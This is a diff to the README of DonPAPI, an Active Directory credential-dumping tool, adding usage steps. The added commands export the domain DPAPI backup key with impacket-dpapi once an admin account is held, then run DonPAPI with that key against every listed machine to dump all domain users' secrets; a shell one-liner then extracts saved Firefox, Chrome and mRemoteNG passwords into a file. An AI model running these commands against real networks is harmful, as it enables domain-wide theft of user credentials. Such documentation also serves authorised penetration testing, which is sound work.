@@ -70,6 +70,14 @@ It's possible to use the tool with Pass-The-Hash :
 ```bash
 python3 DonPAPI.py DOMAIN/USERNAME@IP_ADDRESS --hashes LM:NT
 ```
+If you get a valid admin account, dump the domain backup key. This backup key (.pvk) can then be used to dump all domain user's secrets :
+```bash
+impacket-dpapi backupkeys --export -t domain.local/username@DC_FQDN -k -no-pass
+```
+Then, use the domain backup key on all machine, with one command. Extract all FQDN in a file (targets for example) and then :
+```bash
+python3 DonPAPI.py -pvk pathtofile.pvk domain.local/username@targets -k -no-pass
+```
 You can parse the output by using this magic one-liner :
 ```bash
 cat DonPapiOutput.txt | grep -ae 'Firefox Password' -e 'Chrome Password' | cut -d : -f 3 | cut -d ' ' -f 2 | sort | uniq >> motdepasse.txt && cat DonPapiOutput.txt | grep -ae '\[mRemoteNG\]' | cut -d : -f 2 | cut -d ' ' -f 1 | sort | uniq >> motdepasse.txt & cat motdepasse.txt | sort | uniq | sed "s,\x1B\[[0-9;]*[a-zA-Z],,g" > motdepasse.txt
